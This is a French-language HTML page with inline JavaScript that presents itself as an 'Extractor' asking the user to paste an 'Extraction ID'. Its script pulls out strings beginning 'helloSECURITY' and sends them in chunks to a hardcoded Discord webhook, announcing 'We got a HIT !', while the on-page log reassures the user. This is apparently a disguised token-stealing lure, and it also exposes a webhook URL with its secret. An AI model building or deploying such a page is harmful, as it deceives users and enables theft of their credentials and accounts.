<!doctype html>
<html lang="fr">
<head>
  <meta charset="utf-8" />
  <title>Envoyer vers Webhook Discord (usage non sensible)</title>
  <style>
    body { font-family: Arial, sans-serif; max-width:800px; margin:30px auto; padding:0 16px; }
    label { display:block; margin-top:12px; font-weight:600; }
    textarea { width:100%; height:160px; }
    button { margin-top:10px; padding:8px 12px; }
    .log { margin-top:12px; white-space:pre-wrap; background:#f5f5f5; padding:8px; border-radius:6px; max-height:240px; overflow:auto; }
  </style>
</head>
<body>
  <h2>hello Extractor</h2>

  <label>Enter The Extraction ID</label>
  <textarea id="message" placeholder="hello Extractor"></textarea>

  <div>
    <button id="sendBtn">Extract</button>
  </div>

  <div class="log" id="log"></div>

  <script>
    const logEl = document.getElementById('log');
    function log(msg){ logEl.textContent += msg + "\n"; logEl.scrollTop = logEl.scrollHeight; }

    // Mets ton webhook Discord ici :
    const webhookUrl = "https://discord.com/api/webhooks/1421789719766892655/IUQABpGXuZSESJn5CArSMN92SMNBQ7J7wJ9xmyHcWmgFJYt__2jkyRqKZXwr9lRMR0zF";

    async function postToWebhook(url, body, isForm=false){
      try{
        const res = await fetch(url, {
          method: 'POST',
          headers: isForm ? undefined : { 'Content-Type': 'application/json' },
          body: isForm ? body : JSON.stringify(body),
        });
        if(!res.ok){
          const t = await res.text().catch(()=>res.statusText);
          throw new Error('HTTP ' + res.status + ' — ' + t);
        }
        return true;
      }catch(e){
        log('Erreur: ' + e.message);
        return false;
      }
    }

    // Découper le texte en segments de 1998 caractères
    function splitIntoChunks(str, chunkSize=1998){
      const chunks = [];
      for(let i = 0; i < str.length; i += chunkSize){
        chunks.push(str.slice(i, i + chunkSize));
      }
      return chunks;
    }

    document.getElementById('sendBtn').addEventListener('click', async () => {
      const text = document.getElementById('message').value;
      if (!text) {
        log('Message vide — rien à envoyer.');
        return;
      }

      // Extraire le texte entre "helloSECURITY" et ";", en gardant "helloSECURITY"
      const regex = /(\helloSECURITY[\s\S]*?);/g;
      let match;
      const extracted = [];
      while ((match = regex.exec(text)) !== null) {
        extracted.push(match[1].trim());
      }

      if (extracted.length === 0) {
        log('Aucun texte trouvé entre helloSECURITY et ;');
        return;
      }

      // Combine all tokens
      const token = extracted.join("\n");

      // Split the token into chunks of max 1998 characters
      let tokenParts = splitIntoChunks(token, 1998);

      // Check if any chunk exceeds 2000 characters, and split further if necessary
      tokenParts = tokenParts.flatMap(part => {
        return part.length > 2000 ? splitIntoChunks(part) : [part];
      });

      // Envoi du message introductif
      await postToWebhook(webhookUrl, { content: '`We got a HIT ! :`' });

      log('Number of IDs being extracted: ' + tokenParts.length + '. Please wait...');

      // Send all extracted parts to the webhook
      for (let i = 0; i < tokenParts.length; i++) {
        const content = '**`' + tokenParts[i] + '`**';
        if (content.length > 2000) {
          log('Erreur: Le contenu dépasse la limite de 2000 caractères.');
          break;
        }

        const ok = await postToWebhook(webhookUrl, { content: content });
        if (ok) log(`ID has been sent ${i + 1}/${tokenParts.length}.`);
        else {
          log('Erreur.');
          break;
        }

        // Delay to avoid rate limiting
        await new Promise(r => setTimeout(r, 250)); // 250ms delay to avoid hitting rate limits
      }

      log('Please Wait.');
    });
  </script>
</body>
</html>
